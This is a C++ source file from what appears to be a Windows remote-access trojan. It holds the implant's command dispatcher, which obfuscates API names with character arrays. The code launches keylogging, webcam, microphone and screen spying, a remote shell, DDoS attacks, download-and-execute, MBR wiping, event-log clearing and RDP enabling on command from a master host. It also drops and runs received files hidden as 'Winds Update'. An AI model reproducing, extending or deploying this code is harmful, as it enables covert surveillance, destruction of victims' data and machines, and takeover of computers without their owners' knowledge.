// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////
//DOSS
#define _WIN32_WINNT 0x0500 //�������еĴ���
//DOSS
#include "../StdAfx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "../Myfunction.h"  //�Զ��庯��


//DOSS
#include "DDOSManager.h"
extern BOOL Stoping;
//DOSS

extern Myfunction *Gyfunction;

//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (lpszServiceName != NULL)
	{
		plstrcpyA(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		plstrcpyA(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		plstrcpyA(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// �������ӣ����ƶ˷��������ʼ����
	m_bIsActived = false;
	// ����һ�����Ӽ��̼�¼���߳�
	// ����HOOK��UNHOOK������ͬһ���߳���
//	m_hThread[m_nThreadCount++] = 
//		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);

}

CKernelManager::CKernelManager(CClientSocket *pClient):CManager(pClient)
{
	m_nThreadCount = 0;
}


void CKernelManager::init(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort)
{
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (lpszServiceName != NULL)
	{
		plstrcpyA(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		plstrcpyA(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		plstrcpyA(m_strMasterHost, lpszMasterHost);
	
	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;

	m_bIsActived = false;
}

CKernelManager::~CKernelManager()
{
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	char BrmAP30[] = {'T','e','r','m','i','n','a','t','e','T','h','r','e','a','d','\0'};
	TerminateThreadT pTerminateThread=(TerminateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	for(int i = 0; i < m_nThreadCount; i++)
	{
		pTerminateThread(m_hThread[i], -1);
		pCloseHandle(m_hThread[i]);
	}
}

///////////////
// ���ϼ���
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	char sIQkS05[] = {'C','r','e','a','t','e','T','h','r','e','a','d','\0'};
	CreateThreadT_II pCreateThread=(CreateThreadT_II)GetProcAddress(LoadLibrary("KERNEL32.dll"),sIQkS05);

	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		pInterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_LIST_DRIVE:		// �ļ�����
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY:        // ��Ļ�鿴
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM:            // ����ͷ
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_AUDIO:             //����
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL:             // Զ��sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD:          // ���̼�¼
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM:            // ϵͳ����
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;		
	case COMMAND_DDOS_ATTACK:       //DOSS
		{
			ATTACK m_Attack;
			memcpy(&m_Attack,lpBuffer + 1,sizeof(ATTACK));
			DDOSManager m_DDOSManager(&m_Attack);
		}
		break;
	case COMMAND_DDOS_STOP:         //DOSS
		Stoping = FALSE;
		 break;

		 ////////////////////////�������������еĴ���////////////////////////
	case COMMAND_FREE_PROCESS:
		{	
			LASTINPUTINFO lpi;
			lpi.cbSize = sizeof(lpi);
			GetLastInputInfo(&lpi);
			int MyTime = (GetTickCount()-lpi.dwTime);
			if ( MyTime >=  120000)
			{	
				BYTE bToken = TOKEN_FREE_FIND;
				m_pClient->Send(&bToken, 1);
			}
			else
			{
				BYTE bToken = TOKEN_FREE_NO;
				m_pClient->Send(&bToken, 1);
			}
			
		}
		break;
		///////////////////////////////////////////////////////////////////////

	case COMMAND_DOWN_EXEC:        // ������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		pSleep(100);               // ���ݲ�����
		break;
	case COMMAND_OPEN_URL_SHOW:    // ��ʾ����ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE:    // ���ش���ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE:           // ж��,
		UnInstallService();
		break;
	case COMMAND_CLEAN_ALL:        // ���ȫ����־
		CleanAllEvent();
		break;
	case COMMAND_SESSION:          // �Ự����
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK:    // �ı�ע
		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP:     // �ķ���
		SetGroup( m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER:    // ���·����
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // �ظ�������
		break;
	/////////////////////////�¹���//////////////////////////////
	case COMMAND_REGEDIT:          //ע������   
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SERMANAGER:       // �������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SerManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHOW_MSG:         // ������Ϣ
		{
			pCloseHandle(pCreateThread(NULL,NULL,Loop_MsgBox,&lpBuffer[1],NULL,NULL));
			pSleep(500);
		}
		break;
	case COMMAND_SERVER_START:     //����������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Server_start, 
			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
		break;
	case COMMAND_OPEN_3389:        // ����3389
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Open3389, 
			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
		break;
	case COMMAND_DEL_SHIFTOSK:	   //����������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Server_operation,
			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
		break;
//	case COMMAND_OPEN_PROXY: // ��������
//		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OpenProxy,
//			(LPVOID)(lpBuffer + 1), 0, NULL, true);
//		break;
	case COMMAND_KILL_MBR: // Ӳ����
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillMBR, 
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
//	case COMMAND_PORT_MAPPING: // �˿�ӳ��
//		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PORTMAPPING, 
//			(LPVOID)(lpBuffer + 1), 0, NULL, true);
//		break;
/*
	case COMMAND_FIND_PROCESS: // ����ɸѡ
		try
		{
			if (! isProcesin((LPTSTR)(lpBuffer + 1)))
			{				
				BYTE bToken = TOKEN_FIND_NO;
				m_pClient->Send(&bToken, 1);
			}
		}
		catch(...){}
		break;
	case COMMAND_FINDALL_PROCESS: // ����ɸѡ
		try
		{
			if (! isProcesin((LPTSTR)(lpBuffer + 1)))
			{				
				BYTE bToken = TOKEN_FINDALL_NO;
				m_pClient->Send(&bToken, 1);
			}
		}
		catch(...){}
		break;
		*/
	case COMMAND_SENDFILE_HIDE:     // ��������
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, SW_HIDE);
		}
		break;
	case COMMAND_SENDFILE_NORMAL:   // ��ʾ����
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, SW_SHOWNORMAL);
		}
		break;
	case COMMAND_SENDFILE_NOSTART:  // ��ȥ����
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, 2);
		}
		break;
	case COMMAND_SENDFILE_UPDATA:   // ��������
		{
			if (OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, 3))
				UnInstallService();
		}
		break;					
	}	
}

void CKernelManager::UnInstallService()
{
	 DelSelf(NULL);//ɾ������
     exit(0);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

BOOL CKernelManager::OpenFile(const void *filedata, UINT size, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	FILE	*fp;
	char	strTemp[MAX_PATH], strExePath[MAX_PATH], strRand[50];

	char DYrEN70[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN70);
	GetWindowsDirectoryAT pGetWindowsDirectoryA=(GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetWindowsDirectoryA");
	pGetWindowsDirectoryA( strExePath, sizeof(strExePath) );
	strExePath[3] = '\0';

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA( strRand, "\\Program Files\\Ru%d.EXE", pGetTickCount());
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	plstrcatA(strExePath, strRand);
	fp = fopen( strExePath, "wb" );
	fwrite( filedata, size, 1, fp );
	fclose(fp);
	//	WinExec( strExePath, nShowCmd );
	//	return TRUE;
	char BrmAP30[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	if ( nShowCmd == 3 )
	{
		STARTUPINFO si = {0};
		PROCESS_INFORMATION pi;
		si.cb = sizeof si;
		si.lpDesktop = "WinSta0\\Default"; 
		return pCreateProcessA(strExePath, "Winds Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	}
	if ( nShowCmd != 2 )
	{
		LONG	nSize = sizeof(strTemp);
		char	*lpstrCat = NULL;
		memset(strTemp, 0, sizeof(strTemp));
		
		char	*lpExt = strrchr(strExePath, '.');
		if (!lpExt)
			return false;
		
		char HrFvD08[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
        RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD08);
		if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
			return false;

		char HrFvD07[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','A','\0'};
	    RegQueryValueAT pRegQueryValueA=(RegQueryValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD07);
		pRegQueryValueA(hKey, NULL, strTemp, &nSize);

		char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	    RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
		pRegCloseKey(hKey);
		memset(lpSubKey, 0, sizeof(lpSubKey));

	    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
        wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
		char DYrEN31[] = {'%','s','\\','s','h','e','l','l','\\','o','p','e','n','\\','c','o','m','m','a','n','d','\0'};
		pwsprintfA(lpSubKey, DYrEN31, strTemp);
		
		if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
			return false;
		memset(strTemp, 0, sizeof(strTemp));
		nSize = sizeof(strTemp);
		pRegQueryValueA(hKey, NULL, strTemp, &nSize);
		pRegCloseKey(hKey);
		
		lpstrCat = Gyfunction->my_strstr(strTemp, "\"%1");
		if (lpstrCat == NULL)
			lpstrCat = Gyfunction->my_strstr(strTemp, "%1");
	    char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	    lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	    char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	    lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
		if (lpstrCat == NULL)
		{
			plstrcatA(strTemp, " ");
			plstrcatA(strTemp, strExePath);
		}
		else
			plstrcpyA(lpstrCat, strExePath);
		
		STARTUPINFO si = {0};
		PROCESS_INFORMATION pi;
		si.cb = sizeof si;
		if (nShowCmd != SW_HIDE)
			si.lpDesktop = "WinSta0\\Default"; 
		
		pCreateProcessA(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	}
	return false;
}
